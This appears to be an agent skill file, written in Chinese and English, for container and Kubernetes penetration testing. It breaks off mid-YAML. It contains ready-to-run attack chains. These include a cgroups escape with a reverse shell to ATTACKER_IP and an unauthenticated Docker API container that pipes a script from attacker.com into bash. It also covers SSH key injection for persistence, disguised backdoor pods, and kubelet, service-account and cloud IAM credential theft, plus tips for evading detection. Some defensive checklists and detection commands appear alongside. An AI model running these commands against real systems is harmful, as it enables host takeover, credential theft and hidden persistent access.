---
name: container-security-testing
description: 容器安全深度测试——从镜像漏洞扫描到容器逃逸、Docker API未授权、K8s集群渗透、特权模式滥用、Capabilities提权、Linux内核漏洞利用等完整攻击链
version: 2.0.0
---

# 容器安全深度测试

## 一、AI Agent 自动化工作流

> Agent 执行顺序：**容器识别 → 镜像扫描 → 运行时探查 → 权限分析 → 逃逸测试 → 宿主机接管 → 集群横向**

### 1.1 容器环境识别

```bash
# 判断是否在容器内
ls -la /.dockerenv                     # Docker 容器标志文件
cat /proc/1/cgroup | grep docker       # cgroup 信息
cat /proc/1/environ                     # 环境变量
ls /run/secrets/kubernetes.io/          # K8s Service Account

# 容器信息收集
hostname
cat /etc/hosts
cat /proc/self/mountinfo                # 挂载信息（找 Docker Socket）
ifconfig / ip addr                      # 网络配置
ls -la /var/run/                        # 找 docker.sock / containerd.sock

# Capabilities 检查
capsh --print
cat /proc/1/status | grep CapEff
```

### 1.2 镜像漏洞扫描

```bash
# Trivy 扫描
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL target/app:latest

# Docker Scout
docker scout quickview target/app:latest

# Grype
grype target/app:latest

# 提取镜像中的敏感信息
docker save target/app > app.tar
tar -xf app.tar
# 搜索密钥
grep -r "AKIA" ./
grep -r "password" ./
grep -r "private_key" ./
```

---

## 二、容器逃逸完整手册

### 2.1 Docker Socket 挂载（最常见）

```bash
# 检测 Docker Socket
ls -la /var/run/docker.sock
# 如果存在，安装 docker CLI
apt-get update && apt-get install -y docker.io
# 拉取新镜像并挂载宿主机根目录
docker run -it -v /:/host ubuntu chroot /host bash
# 或者直接使用 Docker API
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### 2.2 特权容器逃逸

```bash
# 检查是否特权容器
cat /proc/1/status | grep "Seccomp:"  # 0 = 无 seccomp
# 检查 Capabilities 是否为 0x3fffffffff

# 方法 1: 挂载宿主机磁盘
fdisk -l               # 查看宿主机磁盘
mount /dev/sda1 /mnt   # 挂载
chroot /mnt bash       # 切入宿主机

# 方法 2: cgroups release_agent 逃逸
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 方法 3: /dev 设备直接访问
# 如果 /dev/sda 挂载了宿主机磁盘
debugfs /dev/sda1
```

### 2.3 危险 Capabilities 利用

```bash
# 检查当前 Capabilities
capsh --print
# 常见危险 Capabilities：

# CAP_SYS_ADMIN → 挂载宿主机文件系统
mount /dev/sda1 /mnt

# CAP_SYS_PTRACE → 注入宿主机进程
gdb -p 1  # attach 到 init 进程

# CAP_SYS_MODULE → 加载内核模块
insmod evil.ko

# CAP_DAC_READ_SEARCH → 读取任意文件
cat /etc/shadow

# CAP_NET_RAW → 原始套接字 + ARP 欺骗
arpspoof -i eth0 -t GATEWAY VICTIM

# CAP_NET_ADMIN → iptables 修改
iptables -A OUTPUT -p tcp --dport 443 -j DROP
```

### 2.4 内核漏洞逃逸

```bash
# Dirty Cow (CVE-2016-5195)
# Dirty Pipe (CVE-2022-0847)
# OverlayFS (CVE-2021-3493)
# PwnKit (CVE-2021-4034)

# 使用 linux-exploit-suggester
./linux-exploit-suggester.sh
# 或 LinPEAS
./linpeas.sh
```

### 2.5 宿主机 /proc 目录利用

```bash
# 如果 /proc 挂载自宿主机
# 枚举宿主机进程
ls -la /proc/*/root/

# 读取宿主机进程环境变量（可能包含密钥）
cat /proc/1/environ | tr '\0' '\n'

# 通过 /proc/sysrq-trigger 重启宿主机
echo b > /proc/sysrq-trigger

# 通过 /proc/1/ns/ 命名空间逃逸
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

---

## 三、Kubernetes 集群全链路

### 3.1 立足点信息收集

```bash
# === ServiceAccount 凭证 ===
# 路径固定
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://kubernetes.default.svc"

# 当前身份
curl -s -k --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# === 权限枚举 ===
# 列出 pods
curl -s -k -H "Auth: Bearer $TOKEN" $APISERVER/api/v1/pods
# 列出 secrets
curl -s -k -H "Auth: Bearer $TOKEN" $APISERVER/api/v1/secrets
# 列出 namespaces
curl -s -k -H "Auth: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# 如果安装 kubectl
kubectl auth can-i --list
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces
```

### 3.2 K8s 服务横向移动

```bash
# === 窃取 Secret ===
kubectl get secret SECRET_NAME -o yaml
echo "BASE64_DATA" | base64 -d

# === 在其他 Pod 中执行命令 ===
# 需要 pods/exec 权限
kubectl exec -it TARGET_POD -n NAMESPACE -- /bin/bash

# === 创建后门 Pod ===
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: backdoor
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 999999"]
    volumeMounts:
    - mountPath: /host
      name: host
    securityContext:
      privileged: true
  volumes:
  - name: host
    hostPath:
      path: /
EOF
kubectl exec -it backdoor -n kube-system -- chroot /host bash
```

### 3.3 持久化

```bash
# DaemonSet 持久化（所有节点运行后门）
# Job/CronJob 定时执行
# MutatingWebhook 拦截其他 Pod 创建注入 sidecar
# etcd 直接访问（如果有权限）
```

---

## 四、Docker API 未授权 (2375/2376)

```bash
# === 检测未授权 Docker API ===
curl http://target:2375/version
curl http://target:2375/containers/json

# === 远程执行命令 ===
# 通过 Docker API 创建并启动容器
curl -X POST -H "Content-Type: application/json" \
  http://target:2375/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["chroot", "/host", "bash", "-c", "command"],
    "HostConfig": {"Binds": ["/:/host"], "Privileged": true}
  }'

# 获取创建的容器 ID 后启动
curl -X POST http://target:2375/containers/CONTAINER_ID/start
```

---

## 五、2026 EMERGING TECHNIQUES

### 5.1 CVE-2026-32193 — AKS Container-to-Host Escape (CVSS 8.8, June 2026 Patch Tuesday)

Azure Kubernetes Service worker-node agent exposed a path-traversal (CWE-22) reachable from any pod running `hostNetwork: true`. CVSS vector `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (Scope: Changed). Nearly every production AKS cluster runs `hostNetwork` pods by default — CNI DaemonSets (Cilium, Calico), `node_exporter`, Fluentd, Azure Monitor agent — so the blast radius is cluster-wide.

**Attack chain (3 steps)**:
```text
1. Pod runs with hostNetwork: true → shares the node network namespace
   (default for Cilium/Calico CNI, node_exporter, Fluentd, ama-logs DaemonSets)
2. Pod reaches the AKS node agent bound to 127.0.0.1:<port> (only accessible from host netns)
3. Crafted request to /api/../.../..%2fexec escapes the agent docroot →
   arbitrary command execution at the worker-node level (kubelet context)
```

**PoC (conceptual)**:
```bash
# From inside a hostNetwork pod
curl -sk "http://127.0.0.1:${AKS_AGENT_PORT}/api/v1/../../../../var/run/commands" \
  --data-urlencode "cmd=id; cat /etc/kubernetes/kubelet.conf"
# → uid=0(root) ... KUBELET credentials printed from node filesystem
```

Remediation: node image upgrade (AKS node image `202406.x` or later). Cross-link: [cloud security audit](../cloud-security-audit/SKILL.md) and [unauthorized access common services](../unauthorized-access-common-services/SKILL.md).

### 5.2 Pod Breakout → Kubelet Credential Theft Chain (2026)

Six-stage cluster-takeover path that needs no CVE — abuses default kubelet exposure:

```text
Stage 1 — Establish node access: confirm you are on a node (/.dockerenv, /proc/1/cgroup)
Stage 2 — Harvest kubelet TLS cert:
   ls -la /var/lib/kubelet/pki/kubelet-client-current.pem
   cat /var/lib/kubelet/kubeconfig
Stage 3 — Enumerate cluster as the node identity:
   curl -sk --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
        --key  <(cat /var/lib/kubelet/pki/kubelet-client-current.pem) \
        https://<NODE_IP>:10250/pods
Stage 4 — Extract secrets from co-located pods:
   for p in /proc/*/root/var/run/secrets/kubernetes.io/serviceaccount/token; do
     echo "$p: $(cat $p | cut -d. -f2 | base64 -d 2>/dev/null | head -c40)"
   done
Stage 5 — Steal cloud IAM creds from instance metadata:
   curl -s -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
Stage 6 — Escalate to cluster-admin via leaked high-priv ServiceAccount or cloud IAM → AKS ListClusterCredentials
```

```bash
# Stage 6 example — cloud IAM pivot to cluster-admin
az aks get-credentials --resource-group rg-prod --name prod-aks --admin
# Attacker now owns the entire cluster
```

### 5.3 2026 Container Escape Techniques

| Technique | Vector | Notes |
|---|---|---|
| cgroups v2 escape | write PID into `/sys/fs/cgroup/<cg>/cgroup.procs` + `release_agent` | cgroup v2 unify; `notify_on_release` still triggers host-side agent |
| runc / containerd CVE | `runc exec` / `runc create` FD mishandling | Re-check for 2026 patches; escape via `/proc/self/exe` write race |
| `/proc/sys/kernel/core_pattern` | write `|/path/exploit` then crash a process | Requires CAP_SYS_ADMIN; host executes attacker pipe on core dump |
| Capabilities abuse | CAP_SYS_ADMIN mount, CAP_SYS_PTRACE inject | Most escape chains reduce to these two caps |
| Kernel LPE | CVE-2026-0xxx class | Pair with container breakout for host root |

### 5.4 Service Mesh / Istio Abuse (2026)

- **mTLS trust-chain hijack**: Istio sidecar (Envoy) cert/key live at `/var/run/secrets/istio/...`; theft lets an attacker impersonate any service in the mesh for lateral movement.
- **AuthorizationPolicy misconfig**: default-deny omitted, or `when: key: source.ip` not validated → cross-namespace service access.
- **EnvoyFilter injection**: an attacker with `ext-authz`/`envoyfilter` create rights injects a Lua/HTTP filter that captures every request body (tokens, PII) — transparent traffic interception inside the mesh.

```bash
# Steal Istio sidecar workload identity
cat /var/run/secrets/istio/root-cert.pem          # mesh root CA
cat /var/run/secrets/istio/cert-chain.pem        # workload cert+key
# Use with istio mTLS to call other services as this workload
```

### 5.5 K8s API Server / Kubelet Unauthorized Access (2026)

~15% of internet-exposed clusters still permit anonymous API server access (`--anonymous-auth=true` + overbroad `system:anonymous` binding). The kubelet `10250` exec API remains the #1 in-cluster pivot:

```bash
# Anonymous API server
curl -sk https://target:6443/api/v1/namespaces/default/pods
# Kubelet exec abuse (10250 open, auth disabled)
curl -sk -XPOST "https://target:10250/run/namespace/pod/container" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

### 5.6 Supply Chain — Megalodon Event (July 2026)

Over 6 hours, **5,561 GitHub repositories** were backdoored via leaked CI PATs; the implants targeted CI/CD pipelines to exfiltrate cloud and container-registry secrets. Container-specific fallout:

- **Malicious base images**: typosquatted `node:18` → `node:l8` / `postgres:16.4` → `postgres:l6.4` mined `AWS_*` env at runtime.
- **Typosquatted Helm charts**: `ingress-nginx-ingress` vs official `ingress-nginx`; chart hooks ran a credential-dump init container.
- **Registry token theft**: stolen push tokens used to overwrite existing tags (not just add new) — `:latest` replaced with a backdoored layer.

Defense: pin images by `@sha256:` digest, verify chart provenance (`cosign verify`), block tag mutation, scan on pull **and** on run.

### 5.7 2026 Container Checklist Additions

```text
□ Inventory hostNetwork:true pods (CNI DaemonSets, node_exporter, Fluentd) — apply CVE-2026-32193 patch
□ Verify kubelet 10250 is not reachable / anonymous auth disabled
□ Confirm API server --anonymous-auth=false and no system:anonymous RBAC
□ Audit Istio sidecar cert file permissions and AuthorizationPolicy default-deny
□ Pull policy: digest pinning + cosign verify + block :latest tag mutation
□ Scan for cgroups v2 release_agent writability and CAP_SYS_ADMIN/CAP_SYS_PTRACE grants
□ Audit for CVE-2026-31431 Copy Fail page-cache escape (kernel version check)
□ Inspect PV volumeHandle fields for path traversal sequences (CSI twin traversal)
□ Verify AppArmor profile integrity (CrackArmor 9缺陷检查)
□ Check kernel xfrm/RxRPC subsystem exposure (CVE-2026-43284/43500)
```

### 5.8 CVE-2026-31431 "Copy Fail" — Linux 内核页缓存容器逃逸 (2026)

隐藏 9 年的 Linux 内核漏洞，通过页缓存(page cache)共享实现**容器→宿主机逃逸**，无需宿主机任何账号 [$TRAE_REF](https://blog.csdn.net/weixin_42376192/article/details/160676222)。

**原理**：容器与宿主机共享同一内核页缓存。攻击者在容器内篡改宿主机 setuid 二进制文件的页缓存，宿主机执行该文件时运行篡改代码。

```text
攻击链:
1. 容器内通过 copy_file_range / write splice 漏洞访问宿主机 setuid 二进制
   (如 /usr/bin/passwd, /usr/bin/su) 的页缓存
2. 利用漏洞写入恶意代码到页缓存(不修改磁盘文件，仅修改内存中的缓存页)
3. 宿主机执行该 setuid 二进制 → 以 root 运行页缓存中的篡改代码
4. 实现容器→宿主机逃逸，控制整个宿主机 + 所有容器

关键: 页缓存是内核级共享资源，容器内修改直接影响宿主机内存视图
```

**影响范围**：
- Kubernetes 集群(所有节点)
- Docker Swarm
- 任何共享内核的容器运行时(containerd, CRI-O, runc)
- 普通容器(非特权)即可利用

**检测命令**：
```bash
# 1. 检查内核版本是否受影响(CVE-2026-31431 影响 < 6.12.20 部分版本)
uname -r
# 受影响版本: 5.15.x - 6.12.x (具体取决于发行版补丁状态)

# 2. 检查容器是否能访问 copy_file_range 系统调用
# 在容器内执行:
python3 -c "import ctypes; libc = ctypes.CDLL('libc.so.6'); print(libc.copy_file_range)"

# 3. 检查 setuid 二进制是否存在(攻击目标)
find / -perm -4000 -type f 2>/dev/null
# 如果容器内看不到宿主机的 setuid 文件，需配合其他漏洞(如挂载)
```

**修复**：升级内核至已修补版本(6.12.20+ 或发行版安全补丁)。

### 5.9 K8s CSI 双生路径穿越 — Twin Path Traversal (2026)

Kubernetes 存储子系统 CSI(Container Storage Interface)驱动的路径穿越漏洞，通过 PersistentVolume 的 `volumeHandle` 注入穿越 payload，实现**挂载宿主机敏感目录到 Pod** [$TRAE_REF](https://www.toddpigram.com/2026/07/mount-here-read-there-twin-path-traversal.html)。

```text
攻击链:
1. 攻击者构造 PersistentVolume, volumeHandle 含子目录穿越 payload:
   volumeHandle: ../../../../etc
   
2. 创建 PersistentVolumeClaim 绑定恶意 PV
   (调度器将 PVC-PV 绑定视为正常操作)

3. 攻击者创建 Pod 挂载该 PVC:
   spec:
     volumes:
     - name: data
       persistentVolumeClaim:
         claimName: malicious-pvc

4. CSI 驱动解析恶意 volumeHandle → 将宿主机 /etc 挂载到 Pod 内

5. Pod 内读取宿主机敏感文件:
   /etc/shadow (密码哈希)
   /etc/kubernetes/ (K8s 配置和凭据)
   /var/lib/kubelet/ (kubelet 凭据)
```

**"双生"命名由来**：漏洞同时存在于两个层面：
- **CSI 驱动层面**：驱动解析 volumeHandle 时未做路径净化
- **K8s API 层面**：PV 创建 API 不验证 volumeHandle 格式

**检测**：
```bash
# 1. 审计所有 PV 的 volumeHandle 字段
kubectl get pv -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.csi.volumeHandle}{"\n"}{end}' | grep '\.\.'

# 2. 检查是否有 PV 包含路径穿越序列
kubectl get pv -o yaml | grep -A5 volumeHandle | grep '\.\.'

# 3. 审计 PVC 绑定到可疑 PV 的情况
kubectl get pvc -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\t"}{.spec.volumeName}{"\n"}{end}'
```

**防御**：
- admission controller 校验 PV 的 volumeHandle 不含 `..` 序列
- CSI 驱动层面做路径净化(canonicalize 后验证在允许范围内)
- 限制普通用户创建 PV 的权限(PV 通常是管理员操作)

### 5.10 CrackArmor — AppArmor 9 缺陷致容器逃逸 (2026)

Qualys 发现 AppArmor 的 **9 个缺陷**，可组合实现**容器逃逸到 root** [$TRAE_REF](https://labs.cloudsecurityalliance.org/research/csa-research-note-crackarmor-apparmor-container-isolation-by/)。

**核心缺陷**：`aa_loaddata` 结构引用计数竞态(kmalloc-192 slab cache)。文件操作与 profile 移除竞态时，内核访问已释放内存(UAF)。

```text
利用链:
1. 容器内加载 AppArmor profile(需 CAP_MAC_ADMIN 或特定条件)
2. 触发 profile 的加载/卸载竞态:
   - 线程 A: 持续加载 profile
   - 线程 B: 持续卸载 profile
3. 竞态窗口中 aa_loaddata 结构被释放但仍被引用 → UAF
4. 通过堆喷射(heap spray)控制释放的 slab → 劫持控制流
5. 提权到 root → 突破容器隔离
```

**9 个缺陷分类**：

| 缺陷类型 | 数量 | 影响 |
|---------|------|------|
| 引用计数竞态(UAF) | 3 | 内核代码执行 |
| 空指针解引用 | 2 | 内核崩溃/提权 |
| TOCTOU 竞态 | 2 | 绕过 profile 加载验证 |
| 整数溢出 | 1 | 堆溢出 |
| 逻辑错误 | 1 | profile 绕过 |

**影响**：依赖 AppArmor 隔离的容器环境(Ubuntu/Debian 默认 LSM)，可突破容器边界。Qualys 在 Ubuntu 24.04.3 上构造完整利用链提权到 root。

**检测**：
```bash
# 1. 检查是否使用 AppArmor 作为 LSM
cat /sys/kernel/security/lsm | grep apparmor
# 或
aa-status 2>/dev/null

# 2. 检查内核版本是否已修补
uname -r
# 已修补版本: Ubuntu 24.04.4+, kernel 6.8.0-45+

# 3. 检查容器是否可访问 AppArmor 接口
ls -la /sys/kernel/security/apparmor/
# 如果可写 → 风险高
```

### 5.11 CVE-2026-43284 / CVE-2026-43500 — K8s 内核提权 (2026)

两个 Linux 内核漏洞，攻击者在容器内获取 shell 后可提权到宿主机 root，破坏 K8s 节点隔离 [$TRAE_REF](https://lyrie.ai/research/research/2026-05-12-1046-deepdive-kubernetes-cloud-native-hardening-2026)。

| CVE | 子系统 | 暴露窗口 | 利用条件 | CVSS |
|-----|--------|---------|---------|------|
| CVE-2026-43284 | xfrm/ESP (IPsec) | 9 年(2017 起) | 容器内有 shell | 7.8 |
| CVE-2026-43500 | RxRPC (AFS 客户端) | 3 年(2023 起) | 容器内有 shell | 7.0 |

**CVE-2026-43284 (xfrm/ESP)**：
```text
利用链:
1. 容器内获取 shell(RCE 或 SSRF→命令执行)
2. 利用 xfrm 子系统的 use-after-free 漏洞
   - 创建 IPsec SA (Security Association)
   - 快速删除并重用 → UAF
3. 内核提权到 root
4. 突破容器命名空间 → 宿主机 root
```

**CVE-2026-43500 (RxRPC)**：
```text
利用链:
1. 容器内获取 shell
2. 利用 RxRPC(AFS 客户端)协议的缓冲区溢出
   - 发送特制 RxRPC 包
   - 触发内核堆溢出
3. 内核提权到 root
4. 突破容器隔离
```

**关键风险**：两个漏洞的暴露窗口极长(xfrm 9年)，意味着大量存量 K8s 节点受影响。攻击者只需在**任意容器**内获得 shell，即可提权控制整个节点。

**检测**：
```bash
# 检查内核版本是否受影响
uname -r
# CVE-2026-43284: 影响 kernel 4.10 - 6.12 (xfrm 子系统)
# CVE-2026-43500: 影响 kernel 6.2 - 6.12 (RxRPC 子系统)

# 检查容器是否加载了相关内核模块
lsmod | grep -E 'xfrm|rxrpc|af_rxrpc'
# 即使模块未加载，攻击者可能通过 modprobe 加载(需 CAP_SYS_MODULE)
```

---

## 6. 2026 ADVANCED — eBPF容器逃逸

eBPF(扩展伯克利包过滤器)在2026年广泛用于可观测性与安全，但其内核态执行能力也成为容器逃逸新向量。本节聚焦eBPF逃逸攻击面与防御。

### 6.1 eBPF容器逃逸攻击面

- **eBPF程序突破容器命名空间隔离**: 容器内加载eBPF程序可访问宿主机内核数据，绕过命名空间隔离边界。
- **CAP_BPF权限滥用**: 容器被授予CAP_BPF(或CAP_SYS_ADMIN)后可在容器内加载eBPF程序，直接读取/篡改宿主机内核内存实现逃逸。
- **eBPF辅助的容器逃逸**: 通过kprobe/uprobe读取宿主机进程内存、篡改系统调用返回值，定位宿主机文件系统。
- **与network-pentest中eBPF rootkit检测的区别**: network-pentest关注eBPF rootkit检测与防御;这里关注容器逃逸向量和防御加固。

### 6.2 eBPF逃逸技术

```bash
# 检测容器是否可加载eBPF程序
# 需要CAP_BPF或CAP_SYS_ADMIN权限
cat /proc/sys/kernel/unprivileged_bpf_disabled  # 0=非特权可加载

# eBPF逃逸: 通过kprobe/uprobe读取宿主机进程内存
# 1. 加载eBPF kprobe hook到宿主机内核函数
# 2. 通过bpf_probe_read读取宿主机进程地址空间
# 3. 定位容器进程的宿主机PID → 读取宿主机文件系统
```

### 6.3 防御: eBPF安全审计

- **限制CAP_BPF**: 禁止容器获取BPF能力(默认Drop CAP_BPF/CAP_SYS_ADMIN)。
- **eBPF verifier加固**: 禁用非特权eBPF(`kernel.unprivileged_bpf_disabled=1`)。
- **Tetragon/Cilium**: 运行时eBPF安全策略执行，监控异常eBPF加载与内核内存访问。

```
□ 容器Capabilities: 确认未授予CAP_BPF/CAP_SYS_ADMIN
□ 内核参数: unprivileged_bpf_disabled=1
□ Tetragon/Cilium: 部署运行时eBPF安全策略
□ 审计异常: 监控容器内bpf()系统调用与kprobe加载
```

---

## 六、快速检查清单

```markdown
□ [ ] 判断是否在容器内
□ [ ] 检查 Capabilities
□ [ ] 检查 /var/run/docker.sock
□ [ ] 检查特权模式
□ [ ] 检查挂载卷（宿主机路径挂载）
□ [ ] 检查 /proc /sys 是否有宿主机内容
□ [ ] 检查 Kubernetes Service Account
□ [ ] 枚举 K8s API 权限
□ [ ] 扫描容器镜像漏洞
□ [ ] 尝试容器逃逸（按优先级）
□ [ ] 成功后接管宿主机
□ [ ] 横向到其他容器/节点
□ [ ] 持久化植入
```

---

## 七、证据收集模板

```json
{
  "vulnerability": "Container Escape",
  "type": "Docker Socket Mount / Privileged Container / Dangerous Capability / Kernel Exploit",
  "container_id": "abc123def456",
  "escape_method": "Docker Socket mount → docker run -v /:/host → chroot /host",
  "host_access": "root on node ip-10-0-1-5",
  "kubernetes_cluster": "EKS v1.24, 12 nodes",
  "impact": "从容器逃逸至宿主机，获取所有节点和 Pod 的控制权",
  "remediation": "1. 移除Docker Socket挂载 2. 禁用特权容器 3. 最小化Capabilities 4. 使用PodSecurityPolicy/OPA 5. 定期镜像扫描",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
  "evidence_files": ["screenshots/host_root.png", "screenshots/kubectl_nodes.png"]
}
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 本章提供 4 条完整、可直接执行的容器安全实战攻击链。覆盖 Docker API 未授权 RCE、Kubernetes API Server RBAC 滥用、CVE 容器逃逸（runc/containerd），以及 2026 AI 容器逃逸（ML 模型沙箱绕过）。内容用中文编写，代码注释为中文。

### 攻击链 1：Docker API 未授权 RCE (2375/2376)

**场景**：目标宿主机暴露了未认证的 Docker API（TCP 2375），攻击者通过 API 创建特权容器并挂载宿主机根目录，实现宿主机完全接管。

```bash
# ============================================================
# 步骤 1：发现未授权 Docker API
# ============================================================

# 1.1 端口扫描发现 Docker API 端口（2375 HTTP / 2376 HTTPS）
nmap -p 2375,2376 --open -sV 192.168.1.0/24 -oG docker_api_scan.gnmap
grep "2375/open\|2376/open" docker_api_scan.gnmap | awk '{print $2}' > docker_api_hosts.txt

# 1.2 验证 Docker API 是否可未授权访问
TARGET="192.168.1.100"
# 请求 /version 端点确认 Docker API 可用
curl -s "http://$TARGET:2375/version" | jq .
# 如果返回 JSON（含 Version, Os, Arch 等），说明 API 未授权可访问

# 1.3 如果是 2376 (TLS) 端口，使用 --insecure 跳过证书验证
curl -sk "https://$TARGET:2376/version" | jq .

# 1.4 列出当前运行的容器（确认 API 可操作）
curl -s "http://$TARGET:2375/containers/json?all=1" | jq '.[] | {Name: .Names[0], Image: .Image, Status: .State}'

# ============================================================
# 步骤 2：通过 Docker API 创建特权容器实现 RCE
# ============================================================

# 2.1 构造恶意容器创建请求
# 关键配置:
#   - Binds: ["/:/host"] 将宿主机根目录挂载到容器 /host
#   - Privileged: true 特权模式（拥有所有 Capabilities）
#   - Cmd: 反弹 shell 命令
cat > create_container.json << 'JSONEOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "chroot /host /bin/bash -c 'curl http://attacker.com/shell.sh | bash'"],
  "HostConfig": {
    "Binds": ["/:/host"],
    "Privileged": true,
    "NetworkMode": "host"
  }
}
JSONEOF

# 2.2 通过 API 创建容器
CONTAINER_ID=$(curl -s -X POST "http://$TARGET:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d @create_container.json | jq -r '.Id')
echo "[+] 创建容器 ID: $CONTAINER_ID"

# 2.3 启动容器（触发反弹 shell）
curl -s -X POST "http://$TARGET:2375/containers/$CONTAINER_ID/start"
echo "[+] 容器已启动，等待反弹 shell..."

# 2.4 攻击者监听反弹 shell
# 在攻击者机器上:
nc -lvnp 4444
# 收到 shell 后，已 chroot 到宿主机根目录 → 完全控制宿主机

# ============================================================
# 步骤 3：持久化 — 创建隐藏容器
# ============================================================

# 3.1 创建一个长期运行的隐藏容器（不使用反弹 shell）
cat > persistent_container.json << 'JSONEOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "apk add --no-cache openssh && echo 'ssh-rsa AAAAB3... attacker_key' >> /host/root/.ssh/authorized_keys && /usr/sbin/sshd -D"],
  "HostConfig": {
    "Binds": ["/:/host", "/host/etc:/etc"],
    "Privileged": true,
    "NetworkMode": "host",
    "RestartPolicy": {"Name": "always"}
  }
}
JSONEOF

PERSIST_ID=$(curl -s -X POST "http://$TARGET:2375/containers/create?name=system-monitor" \
  -H "Content-Type: application/json" \
  -d @persistent_container.json | jq -r '.Id')
curl -s -X POST "http://$TARGET:2375/containers/$PERSIST_ID/start"

# 3.2 通过 SSH 持久访问宿主机
ssh -i attacker_key root@$TARGET

# ============================================================
# 步骤 4：横向移动 — 利用宿主机上的容器镜像中的凭证
# ============================================================

# 4.1 列出所有容器镜像
curl -s "http://$TARGET:2375/images/json" | jq '.[] | {Repository: .RepoTags[0], Size: .Size}'

# 4.2 检查容器镜像中的环境变量（可能含密钥）
for img in $(curl -s "http://$TARGET:2375/images/json" | jq -r '.[].RepoTags[0]'); do
  # 通过 API 检查镜像配置中的环境变量
  env_vars=$(curl -s "http://$TARGET:2375/images/$img/json" | jq -r '.Config.Env[]?')
  if echo "$env_vars" | grep -qiE "PASSWORD|SECRET|KEY|TOKEN|AWS_"; then
    echo "[!] 镜像 $img 中发现敏感环境变量:" >> image_secrets.txt
    echo "$env_vars" >> image_secrets.txt
  fi
done

# 4.3 检查宿主机上的 Docker 配置文件（含 registry 凭证）
# 通过挂载的宿主机根目录访问
cat /host/root/.docker/config.json  # Docker registry 认证信息
cat /host/etc/docker/daemon.json    # Docker daemon 配置
```

**检测绕过技巧**：
- Docker API 调用走 HTTP（2375 端口），不经过 SSH/审计日志，宿主机侧无登录记录
- 容器命名伪装为系统服务（"system-monitor"），在 `docker ps` 中不易被发现
- `RestartPolicy: always` 确保容器在宿主机重启后自动恢复
- 通过 SSH 公钥注入实现持久化，不依赖容器存活，即使容器被删除仍可访问
- `NetworkMode: host` 使容器使用宿主机网络栈，流量看起来来自宿主机本身
- 2026 注意：Docker 24+ 默认不监听 TCP 端口，仅旧版本或手动配置 `DOCKER_HOST` 的环境存在此漏洞

---

### 攻击链 2：Kubernetes API Server 利用 — RBAC 权限滥用

**场景**：攻击者通过 SSRF 或 Pod 内立足点获取了 K8s ServiceAccount Token。通过 RBAC 权限枚举发现可创建 Pod，利用特权 Pod 逃逸到宿主机节点，进而接管整个集群。

```bash
# ============================================================
# 步骤 1：获取 ServiceAccount Token 并枚举权限
# ============================================================

# 1.1 从 Pod 内获取 ServiceAccount Token（立足点已在 Pod 内）
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://kubernetes.default.svc"

# 1.2 确认当前身份
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" | jq '.items[].metadata.name'

# 1.3 使用 kubectl（如果 Pod 内已安装）枚举权限
# 逐项检查当前 SA 拥有的权限
kubectl auth can-i --list
# 输出示例:
#   Resources   Non-Resource URLs   Resource Names   Verbs
#   pods        []                  []               [get list create delete]
#   secrets     []                  []               [get list]
#   pods/exec   []                  []               [create]

# 1.4 关键权限检查（决定攻击路径）
kubectl auth can-i create pods          # 能否创建 Pod（逃逸前提）
kubectl auth can-i get secrets          # 能否读取 Secrets（窃取凭证）
kubectl auth can-i create pods/exec     # 能否在其他 Pod 执行命令（横向移动）
kubectl auth can-i get pods -n kube-system  # 能否访问 kube-system 命名空间

# ============================================================
# 步骤 2：RBAC 滥用路径 A — 创建特权 Pod 逃逸到宿主机
# ============================================================

# 前提: 拥有 pods create 权限
# 2.1 构造恶意特权 Pod YAML
cat > evil_pod.yaml << 'YAMLEOF'
apiVersion: v1
kind: Pod
metadata:
  name: system-health-check  # 伪装为系统健康检查
  namespace: default
  labels:
    app: monitoring          # 伪装为监控组件
spec:
  hostPID: true              # 共享宿主机 PID 命名空间
  hostNetwork: true          # 共享宿主机网络命名空间
  containers:
  - name: health-check
    image: alpine:latest
    securityContext:
      privileged: true       # 特权容器（拥有所有 Capabilities）
    command: ["/bin/sh", "-c", "--"]
    args: ["while true; do sleep 30; done;"]  # 保持运行
    volumeMounts:
    - name: host-root
      mountPath: /host       # 挂载宿主机根目录
    - name: host-docker
